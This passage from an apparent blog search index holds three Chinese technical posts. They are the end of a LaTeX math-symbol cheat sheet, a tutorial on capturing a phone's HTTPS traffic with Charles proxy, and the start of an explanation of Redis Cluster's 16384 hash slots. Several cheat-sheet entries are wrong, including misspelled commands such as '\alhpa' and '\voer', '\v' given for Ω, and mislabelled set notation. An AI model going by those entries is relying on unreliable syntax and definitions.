y$；</li><li><code>quad空格</code>：格式为<code>\quad</code>，如：<code>$x \quad y$</code>，展示效果为：$x \quad y$；</li><li><code>大空格</code>：格式为<code>\</code>，如：<code>$x \ y$</code>，展示效果为：$x \ y$；</li><li><code>中空格</code>：格式为<code>\:</code>，如：<code>$x : y$</code>，展示效果为：$x : y$；</li><li><code>小空格</code>：格式为<code>\,</code>，如：<code>$x , y$</code>，展示效果为：$x , y$；</li><li><code>没有空格``：格式为</code> <code>，如：</code>$xy$&#96;，展示效果为：$xy$；</li><li><code>紧贴</code>：格式为<code>\!</code>，如：<code>$x ! y$</code>，展示效果为：$x ! y$；</li></ul><h2 id="2-5、定界符与组合"><a href="#2-5、定界符与组合" class="headerlink" title="2.5、定界符与组合"></a>2.5、定界符与组合</h2><ul><li><code>括号</code>：格式为<code>（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)</code>，如：<code>$()\big(\big) \Big(\Big)\bigg(\bigg)\Bigg(\Bigg)$</code>，展示效果为：$（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)$；</li><li><code>中括号</code>：格式为<code>[]</code>，如：<code>$[x+y]$</code>，展示效果为：$[x+y]$；</li><li><code>大括号</code>：格式为<code>\{ \}</code>，如：<code>${x+y}$</code>，展示效果为：${x+y}$；</li><li><code>自适应括号</code>：格式为<code>\left \right</code>，如：<code>$\left(x\right)$</code>，<code>$\left(x{yz}\right)$</code>，展示效果为：$\left(x\right)$，$\left(x{yz}\right)$；</li><li><code>组合公式</code>：格式为<code>{上位公式 \choose 下位公式}</code>，如：<code>${n+1 \choose k}={n \choose k}+{n \choose k-1}$</code>,展示效果为：${n+1 \choose k}&#x3D;{n \choose k}+{n \choose k-1}$；</li><li><code>组合公式</code>：格式为<code>{上位公式 \atop 下位公式}</code>，如：<code>$\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A_{k_0}A_{k_1}\cdots$</code>，展示效果为：$\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots&#x3D;n}A_{k_0}A_{k_1}\cdots$；</li></ul><h2 id="2-6、四则运算"><a href="#2-6、四则运算" class="headerlink" title="2.6、四则运算"></a>2.6、四则运算</h2><ul><li><code>加法运算</code>：格式为符号：<code>+</code>，如：<code>$x+y=z$</code>，展示效果为：$x+y&#x3D;z$；</li><li><code>减法运算</code>：格式为<code>-</code>，如：<code>$x-y=z$</code>，展示效果为：$x-y&#x3D;z$；</li><li><code>加减运算</code>：格式为<code>\pm</code>，如：<code>$x \pm y=z$</code>，展示效果为：$x \pm y&#x3D;z$；</li><li><code>减甲运算</code>：格式为<code>\mp</code>，如：<code>$x \mp y=z$</code>，展示效果为：$x \mp y&#x3D;z$；</li><li><code>乘法运算</code>：格式为<code>\times</code>，如：<code>$x \times y=z$</code>，展示效果为：$x \times y&#x3D;z$；</li><li><code>点乘运算</code>：格式为<code>\cdot</code>，如：<code>$x \cdot y=z$</code>，展示效果为：$x \cdot y&#x3D;z$；</li><li><code>星乘运算</code>：格式为<code>\ast</code>，如：<code>$x \ast y=z$</code>，展示效果为：$x \ast y&#x3D;z$；</li><li><code>除法运算</code>：格式为<code>\div</code>，如：<code>$x \div y=z$</code>，展示效果为：$x \div y&#x3D;z$；</li><li><code>斜法运算</code>：格式为<code>/</code>，如：<code>$x/y=z$</code>，展示效果为：$x&#x2F;y&#x3D;z$；</li><li><code>分式表示</code>：格式为<code>\frac{分子}{分母}</code>，如：<code>$\frac{x+y}{y+z}$</code>，展示效果为：$\frac{x+y}{y+z}$；</li><li><code>分式表示</code>：格式为<code>{分子} \voer {分母}</code>，如：<code>${x+y} \over {y+z}$</code>，展示效果为：${x+y} \over {y+z}$；</li><li><code>绝对值表示</code>：格式为<code>||</code>，如：<code>$|x+y|$</code>，展示效果为：$|x+y|$；</li></ul><h2 id="2-7、高级运算"><a href="#2-7、高级运算" class="headerlink" title="2.7、高级运算"></a>2.7、高级运算</h2><ul><li>平均数运算：格式为<code>\overline{算式}</code>，如：<code>$\overline{xyz}$</code>，展示效果为：$\overline{xyz}$；</li><li>开二次方运算：格式为<code>\sqrt</code>，如：$\sqrt x$，展示效果为：；</li><li>开方运算：格式为<code>\sqrt[开方数]{被开方数}</code>，如：<code>$\sqrt[3]{x+y}$</code>，展示效果为：$\sqrt[3]{x+y}$；</li><li>对数运算：格式为<code>\log</code>，如：<code>$\log(x)$</code>，展示效果为：$\log(x)$；</li><li>极限运算：格式为<code>\lim</code>，如：<code>$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</code>，展示效果为：$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$；</li><li>极限运算：格式为<code>\displaystyle \lim</code>，如：<code>$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</code>，展示效果为：$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$；</li><li>求和运算：格式为<code>\sum</code>，如：<code>$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</code>，展示效果为：$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$；</li><li>求和运算：格式为<code>\displaystyle \sum</code>，如：<code>$\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</code>，展示效果为：$\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$；</li><li>积分运算：格式为<code>\int</code>，如：<code>$\int^{\infty}_{0}{xdx}$</code>，展示效果为：$\int^{\infty}_{0}{xdx}$；</li><li>积分运算：格式为<code>\displaystyle \int</code>，如：<code>$\displaystyle \int^{\infty}_{0}{xdx}$</code>，展示效果为：$\displaystyle \int^{\infty}_{0}{xdx}$；</li><li>微分运算：格式为<code>\partial</code>，如：<code>$\frac{\partial x}{\partial y}$</code>，展示效果为：$\frac{\partial x}{\partial y}$；</li><li>矩阵表示：格式为<code>\begin{matrix} \end{matrix}</code>，如：<code>$\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;4\5 &amp;6 &amp;\cdots &amp;8\\vdots &amp;\vdots &amp;\ddots &amp;\vdots\13 &amp;14 &amp;\cdots &amp;16\end{matrix} \right]$</code>，展示效果为：$\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;4\5 &amp;6 &amp;\cdots &amp;8\vdots &amp;\vdots &amp;\ddots &amp;\vdots\13 &amp;14 &amp;\cdots &amp;16\end{matrix} \right]$；</li></ul><h2 id="2-8、逻辑运算"><a href="#2-8、逻辑运算" class="headerlink" title="2.8、逻辑运算"></a>2.8、逻辑运算</h2><ul><li>等于运算：格式为<code>=</code>，如：<code>$x+y=z$</code>，展示效果为：$x+y&#x3D;z$；</li><li>大于运算：格式为<code>&gt;</code>，如：<code>$x+y&gt;z$</code>，展示效果为：$x+y&gt;z$；</li><li>小于运算：格式为<code>&lt;</code>，如：<code>$x+y&lt;z$</code>，展示效果为：$x+y&lt;z$；</li><li>大于等于运算：格式为<code>\geq</code>，如：<code>$x+y \geq z$</code>，展示效果为：$x+y \geq z$；</li><li>小于等于运算：格式为<code>\leq</code>，如：<code>$x+y \leq z$</code>，展示效果为：$x+y \leq z$；</li><li>不等于运算：格式为<code>\neq</code>，如：<code>$x+y \neq z$</code>，展示效果为：$x+y \neq z$；</li><li>不大于等于运算：格式为<code>\ngeq</code>，如：<code>$x+y \ngeq z$</code>，展示效果为：$x+y \ngeq z$；</li><li>不大于等于运算：格式为<code>\not\geq</code>，如：<code>$x+y \not\geq z$</code>，展示效果为：$x+y \not\geq z$；</li><li>不小于等于运算：格式为<code>\nleq</code>，如：<code>$x+y \nleq z$</code>，展示效果为：$x+y \nleq z$；</li><li>不小于等于运算：格式为<code>\not\leq</code>，如：<code>$x+y \not\leq z$</code>，展示效果为：$x+y \not\leq z$；</li><li>约等于运算：格式为<code>\approx</code>，如：<code>$x+y \approx z$</code>，展示效果为：$x+y \approx z$；</li><li>恒定等于运算：格式为<code>\equiv</code>，如：<code>$x+y \equiv z$</code>，展示效果为：$x+y \equiv z$；</li></ul><h2 id="2-9、集合运算"><a href="#2-9、集合运算" class="headerlink" title="2.9、集合运算"></a>2.9、集合运算</h2><ul><li>属于运算：格式为<code>\in</code>，如：<code>$x \in y$</code>，展示效果为：$x \in y$；</li><li>不属于运算：格式为<code>\notin</code>，如：<code>$x \notin y$</code>，展示效果为：$x \notin y$；</li><li>不属于运算：格式为<code>\not\in</code>，如：<code>$x \not\in y$</code>，展示效果为：$x \not\in y$；</li><li>子集运算：格式为<code>\subset</code>，如：<code>$x \subset y$</code>，展示效果为：$x \subset y$；</li><li>子集运算：格式为<code>\supset</code>，如：<code>$x \supset y$</code>，展示效果为：$x \supset y$；</li><li>真子集运算：格式为<code>\subseteq</code>，如：<code>$x \subseteq y$</code>，展示效果为：$x \subseteq y$；</li><li>非真子集运算：格式为<code>\subsetneq</code>，如：<code>$x \subsetneq y$</code>，展示效果为：$x \subsetneq y$；</li><li>真子集运算：格式为<code>\supseteq</code>，如：<code>$x \supseteq y$</code>，展示效果为：$x \supseteq y$；</li><li>非真子集运算：格式为<code>\supsetneq</code>，如：<code>$x \supsetneq y$</code>，展示效果为：$x \supsetneq y$；</li><li>非子集运算：格式为<code>\not\subset</code>，如：<code>$x \not\subset y$</code>，展示效果为：$x \not\subset y$；</li><li>非子集运算：格式为<code>\not\supset</code>，如：<code>$x \not\supset y$</code>，展示效果为：$x \not\supset y$；</li><li>并集运算：格式为<code>\cup</code>，如：<code>$x \cup y$</code>，展示效果为：$x \cup y$；</li><li>交集运算：格式为<code>\cap</code>，如：<code>$x \cap y$</code>，展示效果为：$x \cap y$；</li><li>差集运算：格式为<code>\setminus</code>，如：<code>$x \setminus y$</code>，展示效果为：$x \setminus y$；</li><li>同或运算：格式为<code>\bigodot</code>，如：<code>$x \bigodot y$</code>，展示效果为：$x \bigodot y$；</li><li>同与运算：格式为<code>\bigotimes</code>，如：<code>$x \bigotimes y$</code>，展示效果为：$x \bigotimes y$；</li><li>实数集合：格式为<code>\mathbb{R}</code>，如：<code>mathbb{R}</code>，展示效果为：<code>\mathbb{R}</code>；</li><li>自然数集合：格式为<code>\mathbb{Z}</code>，如：<code>\mathbb{Z}</code>，展示效果为：<code>\mathbb{Z}</code>；</li><li>空集：格式为<code>\emptyset</code>，如：<code>$\emptyset$</code>，展示效果为：$\emptyset$；</li></ul><h2 id="2-10、数学符号"><a href="#2-10、数学符号" class="headerlink" title="2.10、数学符号"></a>2.10、数学符号</h2><ul><li>无穷：格式为<code>\infty</code>，如：<code>$\infty$</code>，展示效果为：$\infty$；</li><li>虚数：格式为<code>\imath</code>，如：<code>$\imath$</code>，展示效果为：$\imath$；</li><li>虚数：格式为<code>\jmath</code>，如：<code>$\jmath$</code>，展示效果为：$\jmath$；</li><li>数学符号：格式为<code>\hat{a}</code>，如：<code>$\hat{a}$</code>，展示效果为：$\hat{a}$；</li><li>数学符号：格式为<code>\check{a}</code>，如：<code>$\check{a}$</code>，展示效果为：$\check{a}$；</li><li>数学符号：格式为<code>\breve{a}</code>，如：<code>$\breve{a}$</code>，展示效果为：$\breve{a}$；</li><li>数学符号：格式为<code>\tilde{a}</code>，如：<code>$\tilde{a}$</code>，展示效果为：$\tilde{a}$；</li><li>数学符号：格式为<code>\bar{a}</code>，如：<code>$\bar{a}$</code>，展示效果为：$\bar{a}$；</li><li>矢量符号：格式为<code>\vec{a}</code>，如：<code>$\vec{a}$</code>，展示效果为：$\vec{a}$；</li><li>数学符号：格式为<code>\acute{a}</code>，如：<code>$\acute{a}$</code>，展示效果为：$\acute{a}$；</li><li>数学符号：格式为<code>\grave{a}</code>，如：<code>$\grave{a}$</code>，展示效果为：$\grave{a}$；</li><li>数学符号：格式为<code>\mathring{a}</code>，如：<code>$\mathring{a}$</code>，展示效果为：$\mathring{a}$；</li><li>一阶导数符号：格式为<code>\dot{a}</code>，如：<code>$\dot{a}$</code>，展示效果为：$\dot{a}$；</li><li>二阶导数符号：格式为<code>\ddot{a}</code>，如：<code>$\ddot{a}$</code>，展示效果为：$\ddot{a}$；</li><li>上箭头：格式为<code>\uparrow</code>，如：<code>$\uparrow$</code>，展示效果为：$\uparrow$；</li><li>上箭头：格式为<code>\Uparrow</code>，如：<code>$\Uparrow$</code>，展示效果为：$\Uparrow$；</li><li>下箭头：格式为<code>\downarrow</code>，如：<code>$\downarrow$</code>，展示效果为：$\downarrow$；</li><li>下箭头：格式为<code>\Downarrow</code>，如：<code>$\Downarrow$</code>，展示效果为：$\Downarrow$；</li><li>左箭头：格式为<code>\leftarrow</code>，如：<code>$\leftarrow$</code>，展示效果为：$\leftarrow$；</li><li>左箭头：格式为<code>\Leftarrow</code>，如：<code>$\Leftarrow$</code>，展示效果为：$\Leftarrow$；</li><li>右箭头：格式为<code>\rightarrow</code>，如：<code>$\rightarrow$</code>，展示效果为：$\rightarrow$；</li><li>右箭头：格式为<code>\Rightarrow</code>，如：<code>$\Rightarrow$</code>，展示效果为：$\Rightarrow$；</li><li>底端对齐的省略号：格式为<code>\ldots</code>，如：<code>$1,2,\ldots,n$</code>，展示效果为：$1,2,\ldots,n$；</li><li>中线对齐的省略号：格式为<code>\cdots</code>，如：<code>$x_1^2 + x_2^2 + \cdots + x_n^2$</code>，展示效果为：$x_1^2 + x_2^2 + \cdots + x_n^2$；</li><li>竖直对齐的省略号：格式为<code>\vdots</code>，如：<code>$\vdots$</code>，展示效果为：$\vdots$；</li><li>斜对齐的省略号：格式为<code>\ddots</code>，如：<code>$\ddots$</code>，展示效果为：$\ddots$；</li></ul><h2 id="2-11、希腊字母"><a href="#2-11、希腊字母" class="headerlink" title="2.11、希腊字母"></a>2.11、希腊字母</h2><table><thead><tr><th align="center">字母</th><th align="center">格式实现</th><th align="center">字母</th><th align="center">格式实现</th></tr></thead><tbody><tr><td align="center">A</td><td align="center"><code>A</code></td><td align="center">α</td><td align="center"><code>\alhpa</code></td></tr><tr><td align="center">B</td><td align="center"><code>B</code></td><td align="center">β</td><td align="center"><code>\beta</code></td></tr><tr><td align="center">Γ</td><td align="center"><code>\Gamma</code></td><td align="center">γ</td><td align="center"><code>\gamma</code></td></tr><tr><td align="center">Δ</td><td align="center"><code>\Delta</code></td><td align="center">δ</td><td align="center"><code>\delta</code></td></tr><tr><td align="center">E</td><td align="center"><code>E</code></td><td align="center">ϵ</td><td align="center"><code>\epsilon</code></td></tr><tr><td align="center">Z</td><td align="center"><code>Z</code></td><td align="center">ζ</td><td align="center"><code>\zeta</code></td></tr><tr><td align="center">H</td><td align="center"><code>H</code></td><td align="center">η</td><td align="center"><code>\eta</code></td></tr><tr><td align="center">Θ</td><td align="center"><code>\Theta</code></td><td align="center">θ</td><td align="center"><code>\theta</code></td></tr><tr><td align="center">I</td><td align="center"><code>I</code></td><td align="center">ι</td><td align="center"><code>\iota</code></td></tr><tr><td align="center">K</td><td align="center"><code>K</code></td><td align="center">κ</td><td align="center"><code>\kappa</code></td></tr><tr><td align="center">Λ</td><td align="center"><code>\Lambda</code></td><td align="center">λ</td><td align="center"><code>\lambda</code></td></tr><tr><td align="center">M</td><td align="center"><code>M</code></td><td align="center">μ</td><td align="center"><code>\mu</code></td></tr><tr><td align="center">N</td><td align="center"><code>N</code></td><td align="center">ν</td><td align="center"><code>\nu</code></td></tr><tr><td align="center">Ξ</td><td align="center"><code>\Xi</code></td><td align="center">ξ</td><td align="center"><code>\xi</code></td></tr><tr><td align="center">O</td><td align="center"><code>O</code></td><td align="center">ο</td><td align="center"><code>\omicron</code></td></tr><tr><td align="center">Π</td><td align="center"><code>\Pi</code></td><td align="center">π</td><td align="center"><code>\pi</code></td></tr><tr><td align="center">P</td><td align="center"><code>P</code></td><td align="center">ρ</td><td align="center"><code>\rho</code></td></tr><tr><td align="center">Σ</td><td align="center"><code>\Sigma</code></td><td align="center">σ</td><td align="center"><code>\sigma</code></td></tr><tr><td align="center">T</td><td align="center"><code>T</code></td><td align="center">τ</td><td align="center"><code>\tau</code></td></tr><tr><td align="center">Υ</td><td align="center"><code>\Upsilon</code></td><td align="center">υ</td><td align="center"><code>\upsilon</code></td></tr><tr><td align="center">Φ</td><td align="center"><code>\Phi</code></td><td align="center">ϕ</td><td align="center"><code>\phi</code></td></tr><tr><td align="center">X</td><td align="center"><code>X</code></td><td align="center">χ</td><td align="center"><code>\chi</code></td></tr><tr><td align="center">Ψ</td><td align="center"><code>\Psi</code></td><td align="center">ψ</td><td align="center"><code>\psi</code></td></tr><tr><td align="center">Ω</td><td align="center"><code>\v</code></td><td align="center">ω</td><td align="center"><code>\omega</code></td></tr></tbody></table><h1 id="三、目前使用的问题"><a href="#三、目前使用的问题" class="headerlink" title="三、目前使用的问题"></a>三、目前使用的问题</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> Latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Charles工具的介绍与使用</title>
      <link href="/2019/09/13/charles/"/>
      <url>/2019/09/13/charles/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.charlesproxy.com/">Charles</a> 是 MacOS 上十分好用的一款抓包工具，它不仅可以抓取明文数据包，也可以在手机端安装相关 SSL 证书后抓取加密的数据包，对于分析手机端应用的交互行为十分有帮助，本文中使用的版本为 <a href="https://www.charlesproxy.com/documentation/version-history/">4.2.8</a>，这里记录一下如何使用 Charles 在 MacOS 下对于安卓手机进行抓包。</p><h2 id="一、环境配置与要求"><a href="#一、环境配置与要求" class="headerlink" title="一、环境配置与要求"></a>一、环境配置与要求</h2><ul><li><code>环境与软件</code>：自行安装，不做介绍<ul><li><code>环境</code>： Charles 本身依赖于 Java 环境，因此需要确保 MacOS 本身已经安装配置完成 Java 的环境；</li><li><code>软件</code>： MacOS 端安装成功 Charles ，并且配置完成所需要抓取的网址信息；</li></ul></li><li><code>设备关联</code>：手机和 Mac 处于同一个局域网中，并且将指定的代理服务器配置为 Charles 实际所监听的 IP 和端口；</li><li><code>证书安装</code>：手机安装完成 Charles SSL CA 证书，证书的获取方式下文会详细介绍（仅用于抓取 HTTPs 的数据包）；</li><li><code>抓包分析</code>：开始抓包分析即可；</li></ul><h2 id="二、MacOS-端软件配置"><a href="#二、MacOS-端软件配置" class="headerlink" title="二、MacOS 端软件配置"></a>二、MacOS 端软件配置</h2><ol><li><p><strong>安装 Charles HTTPS 证书</strong> ：依次点击 <code>Help</code> ，<code>SSL Proxying</code> ，<code>Install Charles Root Certificate</code> ；<br><img src="/assets/images/charles-macos-1.png" alt="安装 Charles HTTPS 证书" loading="lazy"></p></li><li><p><strong>启用并信任证书</strong> ： 点击 <code>Install Charles Root Ceriticate</code> 后，会直接跳到 <code>钥匙串访问</code> ，确保在左侧的 <code>登陆</code> 和 <code>系统</code> 标签页中存在 Charles 的证书，并将其设置为 <code>始终信任</code>，如果对应标签页中没有 Charles 的证书，可切换到对应的标签页，然后重复第 1 步安装证书；<br><img src="/assets/images/charles-macos-2.png" alt="启用并信任证书-登录" loading="lazy"><br><img src="/assets/images/charles-macos-3.png" alt="启用并信任证书-系统" loading="lazy"></p></li><li><p><strong>配置 HTTPs 抓包</strong> ： 依次点击 <code>Proxy</code> ， <code>SSL Proxying Settings...</code> ，之后在开启 <code>Enable SSL Proxying</code> 并新增一个 <code>Include</code> 配置 <code>*:443</code> ；<br><img src="/assets/images/charles-macos-4.png" alt="配置 HTTPs 抓包" loading="lazy"></p></li><li><p><strong>配置端口并开启透明代理</strong> ： 依次点击 <code>Proxy</code> ，<code>Proxy Settings..</code> ，配置 <code>Port</code> 并启用 <code>Enable transparent HTTP proxying</code> ；<br><img src="/assets/images/charles-macos-5.png" alt="配置端口并开启透明代理" loading="lazy"></p></li><li><p><strong>开启代理</strong> ： 点击 <code>Proxy</code> ，并开启 <code>macOS Proxy</code> ；<br><img src="/assets/images/charles-macos-6.png" alt="开启代理" loading="lazy"></p></li><li><p><strong>查看本地 IP 信息</strong>（ifconfig）：<br><img src="/assets/images/charles-macos-7.png" alt="查看本地 IP 信息" loading="lazy"></p></li></ol><h2 id="三、手机端配置"><a href="#三、手机端配置" class="headerlink" title="三、手机端配置"></a>三、手机端配置</h2><h3 id="3-1、网络配置"><a href="#3-1、网络配置" class="headerlink" title="3.1、网络配置"></a>3.1、网络配置</h3><h4 id="3-1-1、安卓端网络配置"><a href="#3-1-1、安卓端网络配置" class="headerlink" title="3.1.1、安卓端网络配置"></a>3.1.1、安卓端网络配置</h4><ul><li>网络代理信息设置：</li></ul><p><img src="/assets/images/phone-network-setting.png" alt="安卓手机端代理配置" loading="lazy"></p><h4 id="3-1-2、IOS端网络配置"><a href="#3-1-2、IOS端网络配置" class="headerlink" title="3.1.2、IOS端网络配置"></a>3.1.2、IOS端网络配置</h4><ul><li><p>网络代理信息设置：</p><p><img src="/assets/images/iosphone-network-setting.png" alt="IOS手机端代理配置" loading="lazy"></p></li></ul><h3 id="3-2、允许网络连接"><a href="#3-2、允许网络连接" class="headerlink" title="3.2、允许网络连接"></a>3.2、允许网络连接</h3><ul><li><code>Charles</code> 中会弹出类似以下弹窗，请求确认是否允许连接访问 <code>Charles</code>，如果禁止将导致安卓端无法联网，选择 <code>Allow</code> 后连接关系建立；</li></ul><p><img src="/assets/images/allow-connection.png" alt="Charles的连接通知" loading="lazy"></p><h3 id="3-3、安装证书"><a href="#3-3、安装证书" class="headerlink" title="3.3、安装证书"></a>3.3、安装证书</h3><h4 id="3-3-1、安卓端证书安装"><a href="#3-3-1、安卓端证书安装" class="headerlink" title="3.3.1、安卓端证书安装"></a>3.3.1、安卓端证书安装</h4><ul><li><code>证书下载</code>：手机访问：<a href="http://chls.pro/ssl">http://chls.pro/ssl</a> ，就会自动下载 Charles 的相关认证证书（确保此时手机已经与 MacOS 处于同一个局域网，并且手机端已经配置了代理服务器的信息，否则将无法下载证书）；</li><li><code>证书安装</code>：点击下载后的证书，进行安装；<ul><li><code>证书名称</code>：为了明确区分该证书的用途以及来源，最好名称比较直观，建议直接使用 <code>Charles</code> 即可；</li><li><code>凭据用途</code>：请选择 <code>WLAN</code> 即可；</li></ul></li></ul><p><img src="/assets/images/ca-ssl.png" alt="安卓端证书安装" loading="lazy"></p><h4 id="3-3-2、IOS端证书安装"><a href="#3-3-2、IOS端证书安装" class="headerlink" title="3.3.2、IOS端证书安装"></a>3.3.2、IOS端证书安装</h4><ul><li><code>证书下载</code>：手机访问：<a href="http://chls.pro/ssl">http://chls.pro/ssl</a> ，就会提示下载 Charles 的相关认证证书（确保此时手机已经与 MacOS 处于同一个局域网，并且手机端已经配置了代理服务器的信息，否则将无法下载证书），点击 允许 后开始下载证书；</li><li><code>证书安装</code>：下载完成后，进入设置，选择下载后的证书，并点击安装；</li><li><code>启用证书</code>：进入设置，通用，关于手机，证书信任设置，启用刚才安装的证书；</li><li>重新启动手机后即可以在电脑端执行抓包；</li></ul><p><img src="/assets/images/ios-install-ca-ssl.png" alt="IOS端安装证书" loading="lazy"></p><p><img src="/assets/images/ios-enable-ca-ssl.png" alt="启用安装的证书" loading="lazy"></p><h2 id="四、抓包分析"><a href="#四、抓包分析" class="headerlink" title="四、抓包分析"></a>四、抓包分析</h2><p>最后即可直接抓包分析即可；</p>]]></content>
      
      
      
        <tags>
            
            <tag> 抓包 </tag>
            
            <tag> MacOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么RedisCluster采用16384个槽位?</title>
      <link href="/2019/09/06/redis-cluster-slots-num/"/>
      <url>/2019/09/06/redis-cluster-slots-num/</url>
      
        <content type="html"><![CDATA[<h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p><code>RedisCluster</code>目前使用的计算<code>slot</code>槽位的算法为<code>CRC16</code>，该算法本身会产生的<code>hash</code>值的大小为<code>16bit</code>，因此该算法可以产生<code>2^16=65536</code>个不同的值，取值范围为<code>0～65535</code>之间，从下面的代码中我们看到，目前限制的<code>slot</code>槽位的个数为<code>16384</code>（相关的代码为<code>crc16(key+s+1,e-s-1) &amp; 0x3FFF</code>）；</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We have 16384 hash slots. The hash slot of a given key is obtained</span><br><span class="hljs-comment"> * as the least significant 14 bits of the crc16 of the key.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * However if the key contains the &#123;...&#125; pattern, only the part between</span><br><span class="hljs-comment"> * &#123; and &#125; is hashed. This may be useful in the future to force certain</span><br><span class="hljs-comment"> * keys to be in the same node (assuming no resharding is in progress). */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">keyHashSlot</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> keylen)</span> &#123;<br>    <span class="hljs-type">int</span> s, e; <span class="hljs-comment">/* start-end indexes of &#123; and &#125; */</span><br><br>    <span class="hljs-keyword">for</span> (s = <span class="hljs-number">0</span>; s &lt; keylen; s++)<br>        <span class="hljs-keyword">if</span> (key[s] == <span class="hljs-string">&#x27;&#123;&#x27;</span>) <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-comment">/* No &#x27;&#123;&#x27; ? Hash the whole key. This is the base case. */</span><br>    <span class="hljs-keyword">if</span> (s == keylen) <span class="hljs-keyword">return</span> crc16(key,keylen) &amp; <span class="hljs-number">0x3FFF</span>;<br><br>    <span class="hljs-comment">/* &#x27;&#123;&#x27; found? Check if we have the corresponding &#x27;&#125;&#x27;. */</span><br>    <span class="hljs-keyword">for</span> (e = s+<span class="hljs-number">1</span>; e &lt; keylen; e++)<br>        <span class="hljs-keyword">if</span> (key[e] == <span class="hljs-string">&#x27;&#125;&#x27;</span>) <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-comment">/* No &#x27;&#125;&#x27; or nothing between &#123;&#125; ? Hash the whole key. */</span><br>    <span class="hljs-keyword">if</span> (e == keylen || e == s+<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> crc16(key,keylen) &amp; <span class="hljs-number">0x3FFF</span>;<br><br>    <span class="hljs-comment">/* If we are here there is both a &#123; and a &#125; on its right. Hash</span><br><span class="hljs-comment">     * what is in the middle between &#123; and &#125;. */</span><br>    <span class="hljs-keyword">return</span> crc16(key+s+<span class="hljs-number">1</span>,e-s<span class="hljs-number">-1</span>) &amp; <span class="hljs-number">0x3FFF</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么槽位个数的时候为什么不直接采用65536呢？作者在2015年5月在相关的<a href="https://github.com/antirez/redis/issues/2576">issue#2576</a>上就给出了答案，作者的回复如下：</p><p><img src="/assets/images/slotsNum.png" alt="antirze的回复" loading="lazy"></p><p>作者这句话的翻译如下所示：</p><blockquote><p>原因是：</p><ol><li>正常的心跳包会携带着节点的完整配置，通过使用与旧的配置信息幂等的配置来更新旧配置。 这意味着它们需要包含原始形式的节点的插槽配置信息，使用16384个slots的话将会占用2k的空间，但是如果使用65536个slots的话将会占用8k空间。 </li><li>同时，由于其他设计权衡，RedisCluster不太可能扩展到超过1000个Master节点。</li></ol><p>所以16384在正确的范围内可以确保每个Master有足够的插槽，最多1000个Master，但是足够小的slots数字可以很容易地将slots的配置作为原始位图数据进行传播。 请注意，在小型集群中，位图难以压缩，因为当N很小时，位图将设置slots&#x2F;N位，这个是一个很大的比特集。</p></blockquote><h2 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h2><p>依据作者给出的答案，作者吧原因定位于<strong>带宽消耗</strong>以及<strong>使用现状</strong>方面，接下来详细说明一下这样设置的原因，RedisCluster使用<code>cluster meet &lt;ip&gt; &lt;port&gt; [bus-port]</code>指令将节点连接到工作集群中，例如将两个redis实例<code>10.0.0.1:6379</code>和<code> 10.0.0.2:6379</code>加入到集群中，我们可以使用<code>redis-cli</code>连接上<code>10.0.0.1:6379</code>，执行<code>cluster meet 10.0.0.2:6379</code>使两个节点建立连接，后续这两个节点就会定期发送<code>ping/pong</code>来交换数据信息。</p><p>这里分析一下在节点数据交换的过程中的几个重点：</p><ul><li>节点交换的数据类型与大小；</li><li>节点数据交换的频率；</li></ul><h3 id="2-1、节点交换的数据类型与大小"><a href="#2-1、节点交换的数据类型与大小" class="headerlink" title="2.1、节点交换的数据类型与大小"></a>2.1、节点交换的数据类型与大小</h3><p>在RedisCluster的不同节点通信过程中，会调用<code>clusterSendPing(clusterLink *link, int type)</code>，依据<code>type</code>区分类型，然后调用<code>clusterBuildMessageHdr()；</code>和<code>clusterSendMessage()；</code>函数构建并发送消息，下面是节点的消息类型：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Message types.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that the PING, PONG and MEET messages are actually the same exact</span><br><span class="hljs-comment"> * kind of packet. PONG is the reply to ping, in the exact format as a PING,</span><br><span class="hljs-comment"> * while MEET is a special PING that forces the receiver to add the sender</span><br><span class="hljs-comment"> * as a node (if it is not already in the list). */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_PING 0          <span class="hljs-comment">/* Ping */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_PONG 1          <span class="hljs-comment">/* Pong (reply to Ping) */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_MEET 2          <span class="hljs-comment">/* Meet &quot;let&#x27;s join&quot; message */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTERMSG_TYPE_FAIL 3          <span class="hljs-comment">/* Mark node xxx as failing */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 